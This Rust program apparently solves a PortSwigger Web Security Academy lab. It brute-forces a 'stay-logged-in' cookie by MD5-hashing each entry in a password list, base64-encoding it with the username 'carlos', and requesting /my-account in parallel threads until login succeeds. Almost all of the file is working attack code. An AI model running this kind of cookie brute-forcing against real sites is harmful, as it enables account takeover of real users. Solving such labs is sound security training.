/*********************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 29/8/2023
*
* Lab: Brute-forcing a stay-logged-in cookie
*
* Steps: 1. Hash every the password
*        2. Encrypt every tha hash with the username in the cookie
*        3. GET /my-account page with every encrypted cookie
*
**********************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use base64::Engine;
use rayon::{iter::plumbing::Producer, prelude::*};
use regex::Regex;
use reqwest::{
    self,
    blocking::{Client, ClientBuilder},
    redirect::Policy,
    Proxy,
};
use std::{
    collections::HashMap,
    error, fs,
    io::{self, Write},
    process, thread,
    time::Duration,
    time::{self, Instant},
};
use text_colorizer::Colorize;

/*********************
* Main Function
**********************/
fn main() -> Result<(), Box<dyn error::Error>> {
    // change this to your lab URL
    let url = "https://0a09002e04be458e83d2e76d0030000b.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // read passwords as one big string
    // change the path to your list
    let passwords_as_string = fs::read_to_string("/home/ahmed/passwords")?;

    // split the big string to a list of passwords
    // change the separator to \r\n if you are still a windows user
    let passwords: Vec<&str> = passwords_as_string.split("\n").collect();

    // set number of threads
    let threads = 8;

    // how many passwords will be tried in each thread
    let chunk_per_thread = passwords.len() / threads;

    // split the whole list to sublist to run each one in a thread
    let passwords_chunks: Vec<_> = passwords.chunks(chunk_per_thread).collect();

    // capture time before brute forcing
    let start_time = time::Instant::now();

    println!(
        "{} {}..",
        "[#] Brute frocing password of".white().bold(),
        "carlos".green().bold()
    );

    // run every sublist in a thread
    passwords_chunks.par_iter().for_each(|minilist| {
        // iterate over every sublist
        for password in minilist.iter() {
            // compute the md5 hash of password
            let password_hash = format!("{:x}", md5::compute(password));

            // encrypt the hash with the username (base64)
            let cookie_encrypted = base64::engine::general_purpose::STANDARD_NO_PAD
                .encode(format!("carlos:{password_hash}"));

            // try to GET /my-account with the modified cookie
            let get_res = client
                .get(format!("{url}/my-account"))
                .header("Cookie", format!("stay-logged-in={cookie_encrypted}"))
                .send()
                .unwrap();

            match get_res.status().as_u16() {
                // check the response status code
                200 => {
                    // if you successfully logged in
                    println!(
                        "\n{}: {}",
                        "✅ Correct pass".white().bold(),
                        password.green().bold()
                    );
                    print_finish_message(start_time);

                    // exit from the program
                    process::exit(0);
                }
                _ => {
                    // the password is incorrect
                    print!(
                        "\r{}: {:10} => {}",
                        "[*] Password".white().bold(),
                        password.blue().bold(),
                        "NOT Correct".red().bold()
                    );
                    io::stdout().flush();
                }
            }
        }
    });
    print_finish_message(start_time);
    Ok(())
}

/**************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
***************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(time::Duration::from_secs(60))
        .build()
        .unwrap()
}

/****************************************************
* Function used to print finish time
*****************************************************/
#[inline(always)]
fn print_finish_message(start_time: Instant) {
    println!(
        "\n{}: {:?} minutes",
        "✅ Finished in".green().bold(),
        start_time.elapsed().as_secs() / 60
    );
}
